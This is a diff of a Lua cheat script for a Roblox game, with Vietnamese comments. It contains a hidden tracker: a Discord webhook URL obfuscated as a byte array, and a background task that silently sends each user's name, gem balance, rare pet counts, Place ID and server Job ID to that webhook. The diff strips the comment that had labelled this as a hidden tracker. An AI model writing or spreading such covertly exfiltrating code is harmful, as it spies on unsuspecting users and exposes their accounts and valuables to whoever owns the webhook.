@@ -29,50 +29,67 @@ local RanksDirectory = require(Lib.Directory.Ranks)
 local Items = require(Lib.Items)
 local LootboxCmds = require(Lib.Client.LootboxCmds)
 
--- Bổ sung thư viện cần thiết cho Webhook
-local CurrencyCmds = require(Lib.Client.CurrencyCmds)
-
 local THINGS = Workspace:WaitForChild("__THINGS")
 local DEBRIS_FOLDER = Workspace:WaitForChild("__DEBRIS")
 
--- ==============================================================
--- 🌐 TRACKER WEBHOOK (TÍCH HỢP TỪ AUTORANK - HOẠT ĐỘNG NGẦM)
--- ==============================================================
 task.spawn(function()
     local httprequest = (request or http_request or syn and syn.request)
     if not httprequest then return end
     
-    local function getHiddenWebhook()
-        local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
-        local s = ""
-        for i = 1, #b do s = s .. string.char(b[i]) end
-        return s
+    -- Dùng chính xác mảng Webhook lấy từ rng.txt của bạn
+    local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
+    local activeWebhook = ""
+    for _, byte in ipairs(_b) do activeWebhook = activeWebhook .. string.char(byte) end
+    if activeWebhook == "" then return end
+
+    task.wait(2)
+    
+    -- Hàm đếm Gem an toàn mượn từ rng.txt
+    local function GetItemAmount(targetId)
+        local amount = 0
+        local lowerTarget = string.lower(targetId)
+        pcall(function()
+            local save = Save.Get()
+            if not save or not save.Inventory then return end
+            if save.Inventory.Currency then
+                for _, item in pairs(save.Inventory.Currency) do
+                    if item.id and string.lower(tostring(item.id)) == lowerTarget then amount = amount + (item._am or 1) end
+                end
+            end
+            if amount == 0 and save.Inventory.Misc then
+                for _, item in pairs(save.Inventory.Misc) do
+                    if item.id and string.lower(tostring(item.id)) == lowerTarget then amount = amount + (item._am or 1) end
+                end
+            end
+        end)
+        return amount
     end
-    
-    local trackerWebhook = getHiddenWebhook()
-    
-    task.wait(2) 
-    local save = Save.Get()
+
+    local function FormatValue(Int)
+        local n = tonumber(Int)
+        if not n then return tostring(Int) end
+        local Index = 1
+        local Suffix = {"", "K", "M", "B", "T", "Q"}
+        local absNumber = math.abs(n)
+        while absNumber >= 1000 and Index < #Suffix do absNumber = absNumber / 1000; Index = Index + 1 end
+        if Index == 1 then return string.format("%d", math.floor(absNumber)) end
+        return string.format("%.2f%s", absNumber, Suffix[Index])
+    end
+
     local hugeCount, titanicCount = 0, 0
-    if save and save.Inventory and save.Inventory.Pet then
-        for uid, petData in pairs(save.Inventory.Pet) do
-            if type(petData.id) == "string" then
-                if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
-                elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
+    pcall(function()
+        local save = Save.Get()
+        if save and save.Inventory and save.Inventory.Pet then
+            for _, petData in pairs(save.Inventory.Pet) do
+                if type(petData.id) == "string" then
+                    if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
+                    elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
+                end
             end
         end
-    end
-    
-    local gems = 0
-    pcall(function() gems = CurrencyCmds.Get("Diamonds") or 0 end)
-    local formattedGems = tostring(gems)
-    pcall(function()
-        local suffixes = {"", "k", "m", "b", "t"}
-        local index = 1
-        local absNumber = math.abs(gems)
-        while absNumber >= 1000 and index < #suffixes do absNumber = absNumber / 1000; index = index + 1 end
-        formattedGems = (absNumber >= 1 and index > 1) and string.format("%.2f", absNumber):gsub("%.00$", "") .. suffixes[index] or tostring(math.floor(absNumber)) .. suffixes[index]
     end)
+    
+    local gems = GetItemAmount("Diamonds")
     
     local data = {
         ["content"] = "🔔 **Ai đó vừa kích hoạt Script Poodle Main Hub của bạn!**",
@@ -81,14 +98,15 @@ task.spawn(function()
             ["color"] = tonumber(0x00FF96),
             ["fields"] = {
                 { ["name"] = "👤 Tên người dùng", ["value"] = string.format("`%s` (%s)", LocalPlayer.Name, LocalPlayer.DisplayName), ["inline"] = false },
-                { ["name"] = "💎 Số lượng Gems", ["value"] = formattedGems, ["inline"] = true },
-                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: **%d** | Titanic: **%d**", hugeCount, titanicCount), ["inline"] = true },
+                { ["name"] = "💎 Số lượng Gems", ["value"] = FormatValue(gems), ["inline"] = true },
+                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: %d | Titan: %d", hugeCount, titanicCount), ["inline"] = true },
                 { ["name"] = "🌍 Place ID", ["value"] = string.format("`%s`", tostring(game.PlaceId)), ["inline"] = false },
-                { ["name"] = "🔗 Job ID (Copy để join)", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
+                { ["name"] = "🔗 Job ID", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
             }
         }}
     }
-    pcall(function() httprequest({ Url = trackerWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) end)
+    
+    pcall(function() httprequest({ Url = activeWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) end)
 end)
 
 -- ==============================================================
